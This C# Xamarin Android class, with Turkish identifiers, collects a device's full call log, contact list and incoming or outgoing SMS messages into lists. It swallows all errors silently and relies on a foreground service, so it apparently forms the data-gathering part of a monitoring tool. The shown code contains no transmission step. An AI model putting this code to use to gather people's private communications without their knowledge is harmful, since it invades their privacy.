using Android.Content;
using Android.Database;
using Android.Provider;
using System;
using System.Collections.Generic;

namespace Task2
{
    public class LogVerileri
    {
        public static string SMS_TURU = default;
        public class Kayit
        {
            public string Numara = default;
            public string Isim = default;
            public string Tarih = default;
            public string Tip = default;
            public string Durasyon = default;
        }
        public class SMS
        {
            public string Gonderen = default;
            public string Icerik = default;
            public string Tarih = default;
            public string Isim = default;
        }
        public class Isimler
        {
            public string Isim = default;
            public string Numara = default;
        }
        Context activity;
        public List<Kayit> kayitlar;
        public List<SMS> smsler;
        public List<Isimler> isimler_;
        string neresi_ = "";
        public LogVerileri(Context _activity, string neresi)
        {
            activity = _activity;
            neresi_ = neresi;
            kayitlar = new List<Kayit>();
            smsler = new List<SMS>();
            isimler_ = new List<Isimler>();
        }
        Dictionary<string, string> donusum = new Dictionary<string, string>()
        {
            {"1","Incoming" },
            {"2","Outgoing" },
            {"3","Missed" },
            {"5","Rejected" },
            {"6","Black List" }
        };
        private string tur(string input)
        {
            try
            {
                return donusum[input];
            }
            catch (Exception) { return "Unknown"; }
        }
        private string suankiZaman(long yunix)
        {
            try
            {
                DateTime start = new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc);
                DateTime date = start.AddMilliseconds(yunix).ToLocalTime();
                return date.ToString();
            }
            catch (Exception) { return "Unknown"; }
        }
        private string durasyon(string input)
        {
            try
            {
                TimeSpan taym = TimeSpan.FromSeconds(Convert.ToDouble(input));
                return taym.ToString(@"hh\:mm\:ss");
            }
            catch (Exception) { return "Unknown"; }
        }
        public void aramaKayitlariniCek()
        {
            try
            {
                Android.Net.Uri uri = CallLog.Calls.ContentUri;
                string[] neleriAlicaz = { CallLog.Calls.Number, CallLog.Calls.CachedName, CallLog.Calls.Date, CallLog.Calls.Duration, CallLog.Calls.Type };
                using (CursorLoader c_loader = new CursorLoader(activity, uri, neleriAlicaz, null, null, null))
                {
                    using (ICursor cursor = (ICursor)c_loader.LoadInBackground())
                    {
                        if (cursor != null)
                        {
                            bool isFirst = cursor.MoveToFirst();
                            if (isFirst)
                            {
                                do
                                {
                                    string isim = "Kayıtsız numara";
                                    try
                                    {
                                        isim = cursor.GetString(cursor.GetColumnIndex(CallLog.Calls.CachedName)).ToString();
                                    }
                                    catch (Exception) { }
                                    kayitlar.Add(new Kayit
                                    {
                                        Tarih = suankiZaman(long.Parse(cursor.GetString(cursor.GetColumnIndex(CallLog.Calls.Date)))),
                                        Numara = cursor.GetString(cursor.GetColumnIndex(CallLog.Calls.Number)).ToString(),
                                        Isim = isim,
                                        Durasyon = durasyon(cursor.GetString(cursor.GetColumnIndex(CallLog.Calls.Duration))),
                                        Tip = tur(cursor.GetString(cursor.GetColumnIndex(CallLog.Calls.Type))),
                                    });
                                } while (cursor.MoveToNext());
                            }
                            cursor.Close();
                        }
                    }
                }
            }
            catch (Exception) { }
        }

        public void rehberiCek()
        {
            try
            {
                using (var phones = activity.ContentResolver.Query(ContactsContract.CommonDataKinds.Phone.ContentUri, null, null, null, null))
                {
                    if (phones != null)
                    {
                        if (phones.MoveToFirst())
                        {
                            do
                            {
                                try
                                {
                                    string name = phones.GetString(phones.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));
                                    string phoneNumber = phones.GetString(phones.GetColumnIndex(ContactsContract.CommonDataKinds.Phone.Number));
                                    isimler_.Add(new Isimler
                                    {
                                        Isim = name,
                                        Numara = phoneNumber
                                    });
                                }
                                catch (Exception) { }

                            } while (phones.MoveToNext());
                        }
                        phones.Close();
                    }
                }
            }
            catch (Exception) { }
        }

        public void smsLeriCek()
        {
            try
            {
                Android.Net.Uri uri = (neresi_ == "gelen") ? Telephony.Sms.Inbox.ContentUri : Telephony.Sms.Sent.ContentUri;

                SMS_TURU = (neresi_ == "gelen") ? "Incoming SMS" : "Outgoing SMS";

                string[] neleriAlicaz = { "body", "date", "address" };

                using (CursorLoader c_loader = new CursorLoader(activity, uri, neleriAlicaz, null, null, null))
                {
                    using (ICursor cursor = (ICursor)c_loader.LoadInBackground())
                    {
                        if (cursor != null)
                        {
                            bool isFirst = cursor.MoveToFirst();
                            if (isFirst)
                            {
                                do
                                {
                                    string isim = "null";
                                    
                                    isim = getContactbyPhoneNumber(ForegroundService._globalService, cursor.GetString(cursor.GetColumnIndex("address")));
                                   
                                    try
                                    {
                                        smsler.Add(new SMS
                                        {
                                            Gonderen = cursor.GetString(cursor.GetColumnIndex("address")),
                                            Icerik = cursor.GetString(cursor.GetColumnIndex("body")),
                                            Tarih = suankiZaman(long.Parse(cursor.GetString(cursor.GetColumnIndex("date")))),
                                            Isim = isim
                                        });
                                    }
                                    catch (Exception) { }

                                } while (cursor.MoveToNext());
                            }
                            cursor.Close();
                        }
                    }
                }
            }
            catch (Exception) { }
        }
        public string getContactbyPhoneNumber(Context c, string phoneNumber)
        {
            try
            {
                Android.Net.Uri uri = Android.Net.Uri.WithAppendedPath(ContactsContract.PhoneLookup.ContentFilterUri, phoneNumber);
                string[] projection = { ContactsContract.Contacts.InterfaceConsts.DisplayName };
                using (ICursor cursor = c.ContentResolver.Query(uri, projection, null, null, null))
                {
                    if (cursor == null)
                    {
                        return phoneNumber;
                    }
                    else
                    {
                        string name = phoneNumber;
                        try
                        {

                            if (cursor.MoveToFirst())
                            {
                                name = cursor.GetString(cursor.GetColumnIndex(ContactsContract.Contacts.InterfaceConsts.DisplayName));
                            }

                        }
                        finally
                        {
                            cursor.Close();
                        }

                        return name;
                    }
                }
            }
            catch (Exception) { return "error"; }
        }
    }
}